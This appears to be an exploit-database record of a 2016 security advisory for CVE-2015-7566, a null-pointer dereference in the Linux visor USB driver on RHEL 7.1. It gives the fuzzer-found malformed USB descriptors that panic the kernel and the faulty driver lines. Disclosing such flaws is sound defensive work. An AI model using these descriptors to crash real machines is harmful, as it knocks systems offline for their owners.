{
    "text": "ecve : CVE-2015-7566 ， title : Linux Kernel 3.10.0 ( CentOS / RHEL 7.1 ) - visor clie_5_attach Nullpointer Dereference - Linux dos Exploit ， verified : Not Verified ， exploit_detail : OS-S Security Advisory 2016-09 ， Linux visor clie_5_attach Nullpointer Dereference ， Date : March 4th , 2016 ， Authors : Sergej Schumilo , Hendrik Schwartke , Ralf Spenneberg ， CVE : CVE-2015-7566 ， CVSS : 4.9 ( AV : L/AC : L/Au : N/C : N/I : N/A : C )  ， Title : Local RedHat Enterprise Linux DoS ?? RHEL 7.1 Kernel crashes on invalid ， USB device descriptors ( visor clie_5_attach driver )  ， Severity : Critical. The Kernel panics. A reboot is required. ， Ease of Exploitation : Trivial ， Vulnerability type : Wrong input validation ， Products : RHEL 7.1 including all updates ， Kernel-Version : 3.10.0-229.20.1.el7.x86_64 ( for debugging-purposes we used the ， CentOS Kernel kernel-debuginfo-3.10.0-229.14.1.el7 )  ， Vendor : Red Hat ， Vendor contacted : November , 12th 2015 ， PDF of advisory :  ， Abstract :  ， The Kernel 3.10.0-229.20.1.el7.x86_64 crashes on presentation of a buggy USB ， device requiring the visor ( clie_5_attach ) driver. ， Detailed product description :  ， We confirmed the bug on the following system :  ， RHEL 7.1 ， Kernel 3.10.0-229.20.1.el7.x86_64 ， Further products or kernel versions have not been tested. ， How reproducible : Always ， Actual results : Kernel crashes. ， Description :  ， The bug was found using the USB-fuzzing framework vUSBf from Sergej Schumilo ，  ( github.com/schumilo ) using the following device descriptor :  ，  [  *  ] Device-Descriptor ， bLength : 0x12 ， bDescriptorType : 0x1 ， bcdUSB : 0x200 ， bDeviceClass : 0x3 ， bDeviceSubClass : 0x0 ， bDeviceProtocol : 0x0 ， bMaxPacketSize : 0x40 ， idVendor : 0x54c ， idProduct : 0x144 ， bcdDevice : 0x100 ， iManufacturer : 0x1 ， iProduct : 0x2 ， iSerialNumbers : 0x3 ， bNumConfigurations : 0x1 ， The clie_5_attach function of the visor driver , which is called during the ， driver initialization process , expects an OUT-Bulk-Endpoint. ， Due to an incomplete sanity check , the visor driver tries to dereference null- ， pointers. ， This results in a crash of the system. ，  $ nm visor.ko.debug | grep clie_5_attach ， 0000000000000030 t clie_5_attach ，  $ addr2line -e visor.ko.debug 6d ， /usr/src/debug/kernel-3.10.0-229.14.1.el7/linux-3.10.0-229.14.1.el7.x86_ ， 64/drivers/usb/serial/visor.c : 610 ， CentOS-Kernel linux-3.10.0-229.14.1.el7 ( drivers/usb/serial/visor.c )  ， 607 ， 608 pipe = usb_sndbulkpipe ( serial->dev , port->bulk_out_endpointAddress )  ;  ， 609 for ( j = 0 ; j < ARRAY_SIZE ( port->write_urbs )  ; ++j )  ， 610 port->write_urbs [ j ] ->pipe = pipe ; / * if there is no configured OUT- ， bulk-endpoint , the kernel tries to dereference null-pointers * / ， 611 ， 612 return 0 ;  ， 613 } ，  [  *  ] Configuration-Descriptor ， bLength : 0x9 ， bDescriptorType : 0x2 ， wTotalLength : 0x27 ， bNumInterfaces : 0x1 ， bConfigurationValue : 0x1 ， iConfiguration : 0x0 ， bmAttributes : 0x0 ， bMaxPower : 0x31 ，  [  *  ] Interface-Descriptor ， bLength : 0x9 ， bDescriptorType : 0x4 ， bInterfaceNumber : 0x0 ， bAlternateSetting : 0x0 ， bNumEndpoints : 0x3 ， bInterfaceClass : 0x0 ， bInterfaceSubClass : 0x0 ， bInterfaceProtocol : 0x0 ，  [  *  ] Endpoint-Descriptor :  ， bLength : 0x7 ， bDescriptorType : 0x5 ， bEndpointAddress : 0x81 ?? IN-Direction ， bmAttribut : 0x1 ?? ISO-Transfer ， wMaxPacketSize : 0x404 ， bInterval : 0xc ，  [  *  ] Endpoint-Descriptor :  ， bLength : 0x7 ， bDescriptorType : 0x5 ， bEndpointAddress : 0x1 ??OUT-Direction ， bmAttribut : 0x1 ??ISO-Transfer ( change this ， value to 0x2 , which is the value for bulk-transfer without additional ， features , and the visor driver won't crash )  ， wMaxPacketSize : 0x4 ， bInterval : 0xc ，  [  *  ] Endpoint-Descriptor :  ， bLength : 0x7 ， bDescriptorType : 0x5 ， bEndpointAddress : 0x82 ??IN-Direction ， bmAttribut : 0x1 ??ISO-Transfer ， wMaxPacketSize : 0x4 ， bInterval : 0xc",
    "time": "2016-03-09"
}